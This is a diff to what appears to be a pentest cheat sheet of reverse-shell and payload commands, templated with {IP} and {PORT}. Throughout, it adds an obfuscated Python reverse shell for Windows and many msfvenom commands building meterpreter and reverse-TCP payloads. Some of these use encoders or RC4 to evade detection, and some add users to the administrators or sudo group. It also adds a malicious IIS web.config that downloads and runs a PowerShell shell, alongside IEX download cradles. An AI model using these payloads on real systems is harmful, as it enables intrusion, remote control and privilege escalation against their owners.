@@ -27,6 +27,11 @@ wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python${IFS}shell.py
 
 python -c 'import pty; pty.spawn("/bin/bash")'
 
+#EXAMPLE
+(Windows)
+
+python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{IP}', {PORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+
 #INDEX
 
 #EXAMPLE
@@ -55,6 +60,12 @@ __import__("os").system("nc -e /bin/sh {IP} {PORT}")
 wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python3${IFS}shell.py
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#EXAMPLE
+(Windows)
+
+python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{IP}', {PORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+
 
 #INDEX
 
@@ -341,6 +352,10 @@ $👽($🐚);
 
 <?php $output = `curl http://{IP}/shell.php|php`; echo "<pre>$output</pre>"; ?>
 
+#EXAMPLE
+
+msfvenom -p php/reverse_php LHOST={IP} LPORT={PORT} -f raw -o shell.php
+
 
 #INDEX
 
@@ -405,24 +420,24 @@ $client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $clie
 
 #EXAMPLE
 
-#References => https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+#References => https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}"
 
-
-#EXAMPLE
-
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/shell.ps1')"
 
 #EXAMPLE
 
-#References => https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')"
+
+#EXAMPLE
+
+#References => https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
 
 powershell.exe "IEX(IWR http://{IP}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}"
 
 #EXAMPLE
 
-powershell.exe "iex(iwr -usebasicparsing http://{IP}/shell.ps1)"
+powershell.exe "iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)"
 
 #EXAMPLE
 
@@ -506,9 +521,24 @@ msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.ex
 
 #EXAMPLE
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=9001 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -o shell.exe
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=9001 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -o shell.exe
+
+#EXAMPLE
+(With Encoder)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -e x86/shikata_ga_nai -b '\x00' -i 3 -o shell.exe 
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
+
+msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o payload.exe
+
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o payload.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
 
 #INDEX
 
@@ -1081,6 +1111,37 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
     }
     </script>
 
+#EXAMPLE
+    
+#Save as web.config
+
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://{IP}/Invoke-PowerShellTcp.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+
 #INDEX
 
 #EXAMPLE
@@ -1403,7 +1464,7 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 EXEC xp_cmdshell "powershell iex(iwr -usebasicparsing http://{IP}/shell.ps1)";
 
-=> You can try use : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+=> You can try use : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 #INDEX
 
@@ -1455,3 +1516,95 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
 
 ## References
 - https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
+
+#INDEX
+
+#EXAMPLE
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o payload.bin
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o payload.bin
+
+#EXAMPLE
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -o payload.bin
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -o payload.bin
+
+#EXAMPLE
+(With Encoder)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.bin 
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
+
+msfvenom -p windows/exec CMD='cmd.raw /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
+
+msfvenom -p windows/x64/exec CMD='cmd.raw /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
+
+#INDEX
+
+#EXAMPLE
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o payload.dll
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o payload.dll
+
+#EXAMPLE
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -o payload.dll
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -o payload.dll
+
+#EXAMPLE
+(With Encoder)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.dll 
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+
+msfvenom -p windows/exec CMD='cmd.dll /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+
+msfvenom -p windows/x64/exec CMD='cmd.dll /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+
+msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+
+#INDEX
+
+#EXAMPLE
+
+msfvenom -p linux/x64/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf
+
+#EXAMPLE
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf
+
+msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf
+
+#EXAMPLE
+(With Encoder)
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -e x86/shikata_ga_nai -i 3 -o shell.elf
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
+
+msfvenom -p linux/x86/exec CMD='sudo usermod -aG sudo username' EXITFUNC=none --encrypt rc4 --encrypt-key{RC4RANDOM} -f elf -o payload.elf
+
+msfvenom -p linux/x64/exec CMD='sudo usermod -aG sudo username' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o payload.elf
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
+
+
+
+
+
